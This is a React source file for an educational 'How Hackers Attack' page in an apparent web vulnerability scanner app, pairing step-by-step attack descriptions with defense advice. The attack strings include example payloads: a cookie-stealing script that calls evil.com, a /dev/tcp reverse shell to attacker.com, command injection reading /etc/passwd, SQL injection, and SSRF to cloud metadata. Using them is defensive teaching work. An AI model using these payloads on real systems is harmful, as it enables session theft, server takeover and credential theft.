import { useState } from "react";
import { Header } from "@/components/layout/header";
import { Sidebar } from "@/components/layout/sidebar";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { AlertTriangle, Search, Shield, BookOpen } from "lucide-react";
import { ALL_SCAN_MODULES } from "@/components/scanner/scan-modules";

const riskColors: Record<string, string> = {
  Critical: "bg-red-700 text-white",
  High: "bg-orange-700 text-white",
  Medium: "bg-yellow-700 text-black",
  Low: "bg-blue-700 text-white"
};

const attackSteps: Record<string, string[]> = {
  sql_injection: [
    "Attacker finds a URL parameter or form field that is used in a database query.",
    "They inject SQL syntax: ' OR '1'='1 — which makes the WHERE clause always true.",
    "The server returns all rows instead of just the matched row (auth bypass / data dump).",
    "Attacker escalates with UNION SELECT to extract other tables: usernames, hashed passwords, credit card data.",
    "With sufficient privileges, they may run OS commands via xp_cmdshell (SQL Server) or MySQL's INTO OUTFILE."
  ],
  xss: [
    "Attacker finds an input that is reflected in the HTML response without encoding.",
    "They inject: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
    "The victim visits a crafted URL or views a page with stored XSS.",
    "The browser executes the injected script — cookies, tokens, or page content are sent to attacker's server.",
    "Attacker uses the stolen session cookie to impersonate the victim without needing their password."
  ],
  command_injection: [
    "Application passes user input directly to a shell function (exec, system, popen).",
    "Attacker appends a separator: ping 8.8.8.8; cat /etc/passwd",
    "The OS executes both commands as the web server user.",
    "Attacker escalates: installs a reverse shell (bash -i >& /dev/tcp/attacker.com/4444 0>&1).",
    "Full server control achieved — attacker can pivot to internal network, steal all data, or install ransomware."
  ],
  auth_bypass: [
    "Attacker navigates directly to /admin, /dashboard, or /api/users.",
    "If the server doesn't verify the session token before serving content, the response is returned.",
    "Attacker gains admin-level access with zero credentials.",
    "They can create new admin accounts, delete users, read all data, or install backdoors.",
    "Often combined with other attacks: enumerate users then brute-force their passwords."
  ],
  open_redirect: [
    "Attacker finds a redirect parameter: /login?next=https://evil.com",
    "They send phishing emails with links that start with your legitimate domain.",
    "Victim sees a trusted URL, clicks it, and is silently redirected to attacker's phishing page.",
    "Phishing page mimics the login form — victim re-enters credentials, which go to the attacker.",
    "Also abused to steal OAuth tokens: redirect the auth callback to attacker-controlled site."
  ],
  cors_misconfiguration: [
    "Attacker hosts a page at https://evil.com with JavaScript that calls your API.",
    "Your server responds with Access-Control-Allow-Origin: https://evil.com (reflecting the attacker's origin).",
    "Combined with Access-Control-Allow-Credentials: true, the browser sends the victim's cookies.",
    "Attacker's script reads the API response — private user data, tokens, account info.",
    "No user interaction needed beyond visiting the attacker's page while logged in to your site."
  ],
  sensitive_data_exposure: [
    "Attacker runs automated scanners that probe common paths: /.env, /.git/config, /phpinfo.php.",
    "/.env file contains DATABASE_URL, API keys, and secrets in plaintext.",
    "Attacker uses the database credentials to connect directly to your database and dump everything.",
    "API keys grant access to third-party services: payment processors, email, cloud storage.",
    ".git/config reveals repository URL — attacker clones the entire codebase to review source."
  ],
  rate_limiting: [
    "Attacker obtains a list of breached email/password combinations (credential dumps).",
    "They run automated tools (Hydra, Burp Intruder) to try each pair against /api/login.",
    "Without rate limiting, they can attempt 10,000+ logins per minute.",
    "When a match is found, the attacker logs in as that user and takes over the account.",
    "Even without credential lists, they can brute-force weak passwords (123456, password, etc.)."
  ],
  clickjacking: [
    "Attacker hosts a page with an invisible iframe of your site, sized to cover a fake button.",
    "Victim sees the attacker's decoy page (e.g., 'Click here to win a prize!').",
    "When victim clicks, they actually click a button on your site inside the hidden iframe.",
    "The click triggers real actions: confirming a payment, following an account, changing a setting.",
    "Victim never sees your site — the iframe is transparent (opacity: 0)."
  ],
  ssrf: [
    "Application accepts a URL parameter and fetches its content server-side (avatar URL, webhook, preview).",
    "Attacker sets the URL to http://169.254.169.254/latest/meta-data/ (AWS IMDS endpoint).",
    "Server fetches the endpoint and returns AWS IAM credentials in the response.",
    "Attacker uses the credentials to access S3 buckets, EC2 instances, or escalate to full AWS account control.",
    "Also used to port-scan internal services, access databases, or hit internal admin panels."
  ]
};

const defenseGuide: Record<string, string> = {
  sql_injection: "Use parameterized queries / prepared statements exclusively. Never concatenate user input into SQL. Apply the principle of least privilege to database accounts. Use an ORM that escapes by default.",
  xss: "HTML-encode all output. Enforce a strict Content Security Policy (CSP). Use modern frameworks that auto-escape. Set HttpOnly and SameSite=Strict on session cookies to limit cookie theft impact.",
  directory_traversal: "Canonicalize file paths with realpath(). Validate that the resolved path starts within the allowed base directory. Never expose raw file paths in URLs. Chroot or jail the web process.",
  command_injection: "Never pass user input to shell commands. Use language-level APIs (subprocess.run with list args, child_process.execFile) instead of shell interpolation. Allowlist valid input characters. Run as a minimal-privilege user.",
  auth_bypass: "Enforce authentication middleware on every route. Default to deny — explicitly grant access. Log and alert on all 401/403 responses. Use multi-factor authentication for admin interfaces.",
  parameter_fuzzing: "Validate and strictly type-check all input at the entry point. Return generic error messages without stack traces. Set a maximum input length. Handle exceptions gracefully server-side.",
  ssl_tls: "Obtain a TLS certificate (free via Let's Encrypt). Redirect all HTTP to HTTPS. Set Strict-Transport-Security: max-age=31536000; includeSubDomains; preload. Disable weak cipher suites.",
  csrf: "Use synchronizer CSRF tokens. Set SameSite=Strict on session cookies. Verify the Origin/Referer headers on state-changing requests. Avoid CORS policies that allow credentials from arbitrary origins.",
  file_inclusion: "Use a hard-coded allowlist of permitted file names. Never construct file paths from user input. In PHP, set allow_url_include=Off. Use realpath() and verify against an allowed base directory.",
  ldap_injection: "Use an LDAP library with parameterized query support. Escape all special LDAP characters. Apply input validation. Reduce query privileges to read-only where possible.",
  xml_injection: "Disable DTD processing and external entities in your XML parser. Validate XML against a strict schema. Use a modern safe XML library with secure defaults.",
  nosql_injection: "Validate and enforce strict types on all inputs before passing to NoSQL queries. Use an ODM library. Disable the $where operator. Sanitize any operator-like characters in user input.",
  ssti: "Never pass user input to template rendering engines. Use a logic-less template engine (Mustache/Handlebars). If templates are required, sandbox them with a restrictive environment.",
  xxe: "Set FEATURE_DISALLOW_DOCTYPE_DECL on your XML parser, or use a safe-by-default library. Upgrade to a modern version with external entity processing disabled. Validate all XML against a strict schema.",
  ssrf: "Validate and allowlist permitted URL schemes and destinations. Block RFC-1918 (private), loopback, and link-local addresses. Enforce redirects through a URL validation layer. Use a dedicated HTTP client with an allowlist.",
  open_redirect: "Use an allowlist of permitted redirect destinations. Map tokens to destination URLs server-side (never embed URLs in parameters). Reject any redirect URL that is not relative or not in the allowlist.",
  cors_misconfiguration: "Maintain an explicit allowlist of trusted origins. Never reflect the Origin header. Never combine wildcard (*) with Allow-Credentials. Add Vary: Origin to prevent caching. Review CORS settings on every new endpoint.",
  security_headers: "Add CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, and Permissions-Policy headers. Use securityheaders.com to audit your current header configuration.",
  sensitive_data_exposure: "Block access to sensitive paths in web-server config. Store all config files outside the web root. Add .env and config files to .gitignore. Use environment variables for secrets, not files.",
  http_methods: "Disable TRACE in your web server (TraceEnable Off in Apache). Restrict allowed HTTP methods to GET, HEAD, POST only. Deny PUT, DELETE, CONNECT, and OPTIONS at the reverse proxy level.",
  clickjacking: "Add X-Frame-Options: DENY (or SAMEORIGIN). Use CSP: frame-ancestors 'none'. Do not rely on JavaScript frame-busting — it can be bypassed. HTTP headers are the only reliable defense.",
  rate_limiting: "Implement rate limiting on auth endpoints (e.g., 5 attempts/minute per IP). Add account lockout after repeated failures. Use CAPTCHA for suspicious patterns. Monitor and alert on brute-force activity.",
  broken_access_control: "Apply authentication and authorization middleware to every API route. Default to deny. Verify the caller's role/permissions before returning data. Log all access control failures and alert on anomalies."
};

export default function AttackGuide() {
  const [search, setSearch] = useState("");

  const filtered = ALL_SCAN_MODULES.filter(m =>
    m.title.toLowerCase().includes(search.toLowerCase()) ||
    m.description.toLowerCase().includes(search.toLowerCase()) ||
    m.cwe.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-primary text-gray-100">
      <Header />
      <div className="flex">
        <Sidebar />
        <main className="flex-1 p-6">
          <div className="mb-6">
            <h1 className="text-2xl font-bold text-white mb-2 flex items-center gap-2">
              <BookOpen className="text-accent" size={26} />
              How Hackers Attack — Education Guide
            </h1>
            <p className="text-gray-400">
              Detailed step-by-step breakdowns of each vulnerability type. Understanding attacker techniques is the first step to building effective defenses.
            </p>
          </div>

          <Card className="bg-yellow-900 bg-opacity-20 border-yellow-700 mb-6">
            <CardContent className="p-4 flex items-start gap-3">
              <AlertTriangle className="text-yellow-400 flex-shrink-0 mt-0.5" size={18} />
              <p className="text-sm text-gray-300">
                <span className="text-yellow-400 font-semibold">Educational Use Only. </span>
                This guide explains attack techniques so you can build better defenses. Never test systems without explicit written authorization. Unauthorized access is illegal in most jurisdictions.
              </p>
            </CardContent>
          </Card>

          <div className="relative mb-6">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" size={16} />
            <Input
              placeholder="Search vulnerabilities..."
              value={search}
              onChange={e => setSearch(e.target.value)}
              className="pl-9 bg-secondary border-gray-700 text-white placeholder-gray-500"
            />
          </div>

          <div className="space-y-4">
            {filtered.map(module => {
              const steps = attackSteps[module.id];
              return (
                <Card key={module.id} className="bg-secondary border-gray-700">
                  <CardHeader className="pb-2">
                    <CardTitle className="flex items-center justify-between text-white text-base">
                      <span className="flex items-center gap-2">
                        <module.icon className={module.color} size={18} />
                        {module.title}
                      </span>
                      <div className="flex items-center gap-2">
                        <Badge className={riskColors[module.risk] || "bg-gray-700 text-white"}>{module.risk}</Badge>
                        <Badge className="bg-gray-700 text-gray-400 text-xs">{module.cwe}</Badge>
                      </div>
                    </CardTitle>
                    <p className="text-sm text-gray-400">{module.description}</p>
                  </CardHeader>
                  <CardContent>
                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                      {/* How attackers do it */}
                      <div>
                        <p className="text-xs text-red-400 font-semibold mb-2 flex items-center gap-1">
                          <AlertTriangle size={12} /> Attack Technique (Step-by-Step)
                        </p>
                        {steps ? (
                          <ol className="space-y-2">
                            {steps.map((step, i) => (
                              <li key={i} className="flex items-start gap-2 text-xs">
                                <span className="text-red-500 font-mono font-bold min-w-[18px]">{i + 1}.</span>
                                <span className="text-gray-300">{step}</span>
                              </li>
                            ))}
                          </ol>
                        ) : (
                          <p className="text-xs text-gray-400 italic">{module.attackDescription}</p>
                        )}
                      </div>

                      {/* Defense */}
                      <div>
                        <p className="text-xs text-green-400 font-semibold mb-2 flex items-center gap-1">
                          <Shield size={12} /> How to Defend Against It
                        </p>
                        <div className="bg-green-950 border border-green-800 rounded p-3 text-xs text-gray-300 space-y-2">
                          <p>
                            <span className="text-green-400 font-semibold">Detection:</span>{" "}
                            {module.description}
                          </p>
                          <p>
                            <span className="text-green-400 font-semibold">Prevention:</span>{" "}
                            {defenseGuide[module.id] ?? "Apply input validation, use parameterized APIs, enforce least-privilege, and monitor for anomalies."}
                          </p>
                          <p className="text-gray-500 border-t border-green-900 pt-2">
                            Test with module: <code className="text-accent">{module.id}</code> · Estimated time: {module.time}
                          </p>
                        </div>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              );
            })}
          </div>
        </main>
      </div>
    </div>
  );
}
